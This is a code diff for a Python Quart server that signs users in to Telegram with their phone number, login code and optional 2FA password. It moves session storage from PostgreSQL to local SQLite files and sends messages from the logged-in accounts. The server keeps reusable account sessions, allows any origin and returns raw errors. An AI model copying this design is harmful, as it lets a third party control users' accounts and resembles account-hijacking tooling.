@@ -6,14 +6,11 @@ from telethon.errors import (
     PhoneCodeInvalidError,
     RPCError,
 )
-from telethon.sessions import StringSession
 from quart import Quart, request, jsonify
 from quart_cors import cors
 import asyncio
 from dotenv import load_dotenv
 import os
-import psycopg2
-from psycopg2 import sql
 import httpx  # For health check of another server
 
 # Load environment variables from the .env file
@@ -29,104 +26,46 @@ app = Quart(__name__)
 app = cors(app, allow_origin="*")  # Apply CORS after app initialization
 
 
-
 # Database Setup
-# Use Render's environment variables for database connection details
-DB_HOST = os.getenv("DB_HOST")
-DB_NAME = os.getenv("DB_NAME")
-DB_USER = os.getenv("DB_USER")
-DB_PASSWORD = os.getenv("DB_PASSWORD")
-DB_PORT = os.getenv("DB_PORT", "5432")
-
-# Connect to PostgreSQL
-try:
-    db_conn = psycopg2.connect(
-        host=DB_HOST,
-        database=DB_NAME,
-        user=DB_USER,
-        password=DB_PASSWORD,
-        port=DB_PORT
-    )
-    db_cursor = db_conn.cursor()
-    print("Connected to PostgreSQL database successfully.")
-except Exception as e:
-    print(f"Error connecting to PostgreSQL: {e}")
-    exit()
-
-# Create Tables
+db_conn = sqlite3.connect("sessions.db", check_same_thread=False)
+db_cursor = db_conn.cursor()
 db_cursor.execute("""
 CREATE TABLE IF NOT EXISTS users (
-    chat_id BIGINT PRIMARY KEY,
+    chat_id INTEGER PRIMARY KEY,
     phone TEXT,
     session_path TEXT
 )
 """)
-
 db_cursor.execute("""
-CREATE TABLE IF NOT EXISTS telegram_sessions (
-    chat_id BIGINT PRIMARY KEY,
-    session_data TEXT NOT NULL
+CREATE TABLE IF NOT EXISTS channels (
+    chat_id INTEGER,
+    channel_url TEXT,
+    PRIMARY KEY (chat_id, channel_url)
 )
 """)
 db_conn.commit()
 
-# Helper Functions
-def check_table_content():
-    tables = ['users', 'channels']
-    for table in tables:
-        print(f"Contents of table '{table}':")
-        try:
-            db_cursor.execute(sql.SQL("SELECT * FROM {}").format(sql.Identifier(table)))
-            rows = db_cursor.fetchall()
-            if rows:
-                for row in rows:
-                    print(row)
-            else:
-                print("Table is empty.")
-        except Exception as e:
-            print(f"Error reading table '{table}': {e}")
-        print()  # Add a blank line for better readability
 
+# Helper Functions
 def save_user_to_db(chat_id, phone, session_path):
     db_cursor.execute("""
-        INSERT INTO users (chat_id, phone, session_path)
-        VALUES (%s, %s, %s)
-        ON CONFLICT (chat_id) DO UPDATE
-        SET phone = EXCLUDED.phone,
-            session_path = EXCLUDED.session_path
+        INSERT OR REPLACE INTO users (chat_id, phone, session_path)
+        VALUES (?, ?, ?)
     """, (chat_id, phone, session_path))
     db_conn.commit()
-    # Call the function to check table contents
-    check_table_content()
 
-# Save session to PostgreSQL
-def save_session_to_db(chat_id, session_string):
-    query = """
-        INSERT INTO telegram_sessions (chat_id, session_data)
-        VALUES (%s, %s)
-        ON CONFLICT (chat_id) DO UPDATE
-        SET session_data = EXCLUDED.session_data;
-    """
-    db_cursor.execute(query, (chat_id, session_string))
-    db_conn.commit()
-    print(f"Session for chat_id {chat_id} saved successfully.")
-
-# Retrieve session from PostgreSQL
-def get_session_from_db(chat_id):
-    query = "SELECT session_data FROM telegram_sessions WHERE chat_id = %s;"
-    db_cursor.execute(query, (chat_id,))
+def get_session_for_user(chat_id):
+    db_cursor.execute("SELECT session_path FROM users WHERE chat_id = ?", (chat_id,))
     result = db_cursor.fetchone()
-    if result:
-        print(f"Session for chat_id {chat_id} retrieved successfully.")
     return result[0] if result else None
 
-# Delete session from PostgreSQL
-def delete_session_from_db(chat_id):
-    query = "DELETE FROM telegram_sessions WHERE chat_id = %s;"
-    db_cursor.execute(query, (chat_id,))
-    db_conn.commit()
-    print(f"Session for chat_id {chat_id} deleted successfully.")
 
+
+# Function to delete session file (forcefully delete session)
+def delete_session(phone):
+    session_file = os.path.join(os.getcwd(), f'session_{phone}.session')
+    if os.path.exists(session_file):
+        os.remove(session_file)
 
 # New function to send a message after successful login
 async def send_message(user_client):
@@ -271,24 +210,18 @@ async def request_code():
         return jsonify({'error': 'Phone number and chat ID are required'}), 400
     
     # Delete any existing session before starting a new login attempt
-    delete_session_from_db(chat_id)
+    delete_session(phone)
 
-     # Try to retrieve the session from the database
-    session_string = get_session_from_db(chat_id)
-    session = StringSession(session_string) if session_string else StringSession()
-
-    # Initialize the Telegram client
-    print("Starting client...")
-    user_client = TelegramClient(session, api_id, api_hash)
+    user_client = TelegramClient(f'session_{phone}', api_id, api_hash)
     try:
         await user_client.connect()
         sent_code = await user_client.send_code_request(phone)
         return jsonify({'message': 'Login code sent', 'phone_code_hash': sent_code.phone_code_hash})
     except RPCError as e:
-        delete_session_from_db(chat_id)
+        delete_session(phone)
         return jsonify({'error': f'RPC error: {e}'}), 500
     except Exception as e:
-        delete_session_from_db(chat_id)
+        delete_session(phone)
         return jsonify({'error': f'Error: {e}'}), 500
     finally:
         await user_client.disconnect()
@@ -304,18 +237,11 @@ async def verify_code():
     phone_code_hash = data.get('phone_code_hash')
     password = data.get('password', None)  # For 2FA password
     chat_id = data.get('chat_id')
-    scraper = data.get('scraper')
 
     if not phone or not code or not phone_code_hash or not chat_id:
         return jsonify({'error': 'Phone, code, phone_code_hash, and chat_id are required'}), 400
 
-     # Try to retrieve the session from the database
-    session_string = get_session_from_db(chat_id)
-    session = StringSession(session_string) if session_string else StringSession()
-
-    # Initialize the Telegram client
-    print("Starting client...")
-    user_client = TelegramClient(session, api_id, api_hash)
+    user_client = TelegramClient(f'session_{phone}', api_id, api_hash)
     try:
         await user_client.connect()
         await user_client.sign_in(phone, code, phone_code_hash=phone_code_hash)
@@ -327,24 +253,22 @@ async def verify_code():
                 return jsonify({'error': 'Two-factor authentication required'}), 403
 
         # Save user session
-         # Save the session back to the database
-        save_session_to_db(chat_id, user_client.session.save())
-        save_user_to_db(chat_id, phone, session)
+        session_path = f'session_{phone}'
+        user_client.session.save()
+        save_user_to_db(chat_id, phone, session_path)
 
-        if not scraper:
-            # Send a message after successful login
-            await send_message(user_client)
+        # Send a message after successful login
+        await send_message(user_client)
 
         return jsonify({'message': 'Login successful and action performed'})
     except PhoneCodeInvalidError:
-        delete_session_from_db(chat_id)
+        delete_session(phone)
         return jsonify({'error': 'Invalid login code'}), 400
     except SessionPasswordNeededError:
-        delete_session_from_db(chat_id)
+        delete_session(phone)
         return jsonify({'error': 'Two-factor authentication required'}), 403
     except Exception as e:
-        delete_session_from_db(chat_id)
-        print(f'error: {e}')
+        delete_session(phone)
         return jsonify({'error': f'Error: {e}'}), 500
     finally:
         await user_client.disconnect()
@@ -363,13 +287,11 @@ async def trigger_send_message():
     
     try:
         # Reuse the existing session if available
-        # Try to retrieve the session from the database
-        session_string = get_session_from_db(chat_id)
-        session = StringSession(session_string) if session_string else StringSession()
-        if not session:
+        session_path = get_session_for_user(chat_id)
+        if not session_path:
             return jsonify({'error': 'No session found for this user'}), 404
 
-        user_client = TelegramClient(session, api_id, api_hash)
+        user_client = TelegramClient(session_path, api_id, api_hash)
         await user_client.connect()
 
         if not await user_client.is_user_authorized():
